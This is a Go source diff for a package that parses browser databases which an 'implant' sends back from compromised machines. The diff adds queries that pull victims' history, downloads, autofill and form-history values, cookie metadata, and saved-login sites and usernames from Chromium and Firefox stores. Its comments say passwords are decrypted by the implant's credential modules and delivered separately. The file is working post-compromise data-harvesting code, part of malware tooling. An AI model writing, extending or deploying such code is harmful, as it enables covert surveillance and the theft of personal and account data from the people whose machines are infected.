@@ -1,6 +1,14 @@
 // Package browser: parse browser SQLite stores that the implant streams back.
-// Only non-credential columns are selected — cookie values and password blobs
-// are never queried.
+//
+// Two families of queries live here:
+//
+//	inventory kinds  — history, bookmarks, cookies, downloads, autofill,
+//	                   formhistory: metadata only, secrets are never selected.
+//	account kinds    — logins: origin/username/usage stats. The password column
+//	                   is still never selected here: password decryption needs
+//	                   the target's DPAPI/Keychain/secret-service context, so it
+//	                   happens in the implant (see cmd/implant/creds_*.go) and
+//	                   arrives through the creds collector instead.
 package browser
 
 import (
@@ -10,15 +18,66 @@ import (
 	"os"
 	"os/exec"
 	"path/filepath"
+	"sort"
 	"strings"
 )
 
-var ErrKind = errors.New("unknown query kind")
+var (
+	ErrKind = errors.New("unknown query kind")
+	// ErrFamily reports a kind that exists for another browser family, e.g.
+	// "logins" against a Firefox places.sqlite (Firefox keeps logins.json).
+	ErrFamily = errors.New("query kind not available for this browser family")
+)
 
 // QuerySpec keeps the SQL and the column order for each supported store.
 type QuerySpec struct {
 	Columns []string
 	SQL     string
+}
+
+var chromiumQueries = map[string]QuerySpec{
+	"history": {
+		Columns: []string{"url", "title", "visits", "last_visit"},
+		SQL: `select url, coalesce(title,'') as title, visit_count as visits,
+       datetime(last_visit_time/1000000-11644473600,'unixepoch','localtime') as last_visit
+  from urls where url not like 'chrome-extension://%'
+ order by last_visit_time desc limit 800`,
+	},
+	"downloads": {
+		Columns: []string{"path", "referrer", "bytes", "started"},
+		SQL: `select coalesce(target_path,'') as path, coalesce(tab_url,'') as referrer,
+       coalesce(total_bytes,0) as bytes,
+       datetime(start_time/1000000-11644473600,'unixepoch','localtime') as started
+  from downloads order by start_time desc limit 500`,
+	},
+	"autofill": {
+		Columns: []string{"field", "uses", "last_used"},
+		SQL: `select name as field, count(*) as uses,
+       datetime(max(date_last_used)/1000000-11644473600,'unixepoch','localtime') as last_used
+  from autofill group by name order by uses desc limit 500`,
+	},
+	"logins": {
+		Columns: []string{"url", "user", "times_used", "created"},
+		SQL: `select coalesce(origin_url,'') as url, coalesce(username_value,'') as user,
+       coalesce(times_used,0) as times_used,
+       datetime(date_created/1000000-11644473600,'unixepoch','localtime') as created
+  from logins order by times_used desc limit 500`,
+	},
+	"cookies": {
+		// metadata only: host, name and expiry. No value/encrypted_value.
+		Columns: []string{"host", "name", "expires"},
+		SQL: `select host_key as host, name,
+       case when expires_utc = 0 then 'session'
+            else datetime(expires_utc/1000000-11644473600,'unixepoch','localtime') end as expires
+  from cookies order by expires_utc desc limit 800`,
+	},
+	"formhistory": {
+		// Chromium keeps form history in Web Data too, but older builds only
+		// expose the autofill table; alias it so the UI has one button.
+		Columns: []string{"field", "value", "uses"},
+		SQL: `select name as field, coalesce(value,'') as value, count(*) as uses
+  from autofill group by name, value order by uses desc limit 500`,
+	},
 }
 
 var firefoxQueries = map[string]QuerySpec{
@@ -38,49 +97,56 @@ var firefoxQueries = map[string]QuerySpec{
  where b.type = 1 and p.url is not null
  order by b.parent, b.position limit 2000`,
 	},
-}
-
-var queries = map[string]QuerySpec{
-	"history": {
-		Columns: []string{"url", "title", "visits", "last_visit"},
-		SQL: `select url, coalesce(title,'') as title, visit_count as visits,
-       datetime(last_visit_time/1000000-11644473600,'unixepoch','localtime') as last_visit
-  from urls where url not like 'chrome-extension://%'
- order by last_visit_time desc limit 800`,
-	},
-	"bookmarks": {
-		// Firefox only: Chrome keeps bookmarks in a JSON file we already parse.
-		Columns: []string{"folder", "name", "url"},
-		SQL: `select coalesce(f.title,'') as folder, coalesce(b.title,'') as name, p.url
-  from moz_bookmarks b
-  join moz_places p on p.id = b.fk
-  left join moz_bookmarks f on f.id = b.parent
- where b.type = 1 and p.url is not null
- order by b.parent, b.position limit 2000`,
+	"formhistory": {
+		Columns: []string{"field", "value", "uses"},
+		SQL: `select coalesce(fieldname,'') as field, coalesce(value,'') as value,
+       coalesce(times_used,0) as uses
+  from moz_formhistory order by times_used desc limit 500`,
 	},
 	"cookies": {
-		// metadata only: host, name and expiry. No value/encrypted_value.
 		Columns: []string{"host", "name", "expires"},
-		SQL: `select host_key as host, name,
-       case when expires_utc = 0 then 'session'
-            else datetime(expires_utc/1000000-11644473600,'unixepoch','localtime') end as expires
-  from cookies order by expires_utc desc limit 800`,
+		SQL: `select host, name,
+       case when expiry = 0 then 'session'
+            else datetime(expiry,'unixepoch','localtime') end as expires
+  from moz_cookies order by expiry desc limit 800`,
 	},
 }
 
+// Spec returns the Chromium-family spec for a kind. Kept for callers that only
+// need column metadata; Run() sniffs the actual family.
 func Spec(kind string) (QuerySpec, bool) {
-	q, ok := queries[strings.ToLower(kind)]
+	q, ok := chromiumQueries[strings.ToLower(kind)]
 	return q, ok
 }
 
 // Known reports whether the kind is valid for at least one browser family.
 func Known(kind string) bool {
 	kind = strings.ToLower(kind)
-	if _, ok := queries[kind]; ok {
+	if _, ok := chromiumQueries[kind]; ok {
 		return true
 	}
 	_, ok := firefoxQueries[kind]
 	return ok
+}
+
+// Kinds lists every supported query kind, sorted for stable output in docs/UI.
+func Kinds() []string {
+	seen := map[string]bool{}
+	var out []string
+	for k := range chromiumQueries {
+		if !seen[k] {
+			seen[k] = true
+			out = append(out, k)
+		}
+	}
+	for k := range firefoxQueries {
+		if !seen[k] {
+			seen[k] = true
+			out = append(out, k)
+		}
+	}
+	sort.Strings(out)
+	return out
 }
 
 // Run writes the database bytes to a temp file and runs the sqlite3 CLI against
@@ -103,7 +169,10 @@ func Run(data []byte, kind string) ([]string, [][]string, error) {
 	if err := os.WriteFile(path, data, 0o600); err != nil {
 		return nil, nil, err
 	}
-	spec := pickSpec(bin, path, kind)
+	spec, err := pickSpec(bin, path, kind)
+	if err != nil {
+		return nil, nil, err
+	}
 	out, err := exec.Command(bin, "-readonly", "-json", path, spec.SQL).CombinedOutput()
 	if err != nil {
 		msg := strings.TrimSpace(string(out))
@@ -135,16 +204,21 @@ func Run(data []byte, kind string) ([]string, [][]string, error) {
 }
 
 // pickSpec sniffs the schema so the same "history" kind works for Firefox
-// (moz_places) and Chromium (urls) stores.
-func pickSpec(bin, path, kind string) QuerySpec {
+// (moz_places) and Chromium (urls) stores, and rejects kinds the detected
+// family does not have instead of running SQL that cannot match.
+func pickSpec(bin, path, kind string) (QuerySpec, error) {
 	probe, err := exec.Command(bin, "-readonly", path,
 		"select name from sqlite_master where name in ('moz_places','urls')").Output()
 	if err == nil && strings.Contains(string(probe), "moz_places") {
 		if q, ok := firefoxQueries[kind]; ok {
-			return q
+			return q, nil
 		}
+		return QuerySpec{}, fmt.Errorf("%w: %s (firefox)", ErrFamily, kind)
 	}
-	return queries[kind]
+	if q, ok := chromiumQueries[kind]; ok {
+		return q, nil
+	}
+	return QuerySpec{}, fmt.Errorf("%w: %s (chromium)", ErrFamily, kind)
 }
 
 func cell(v any) string {
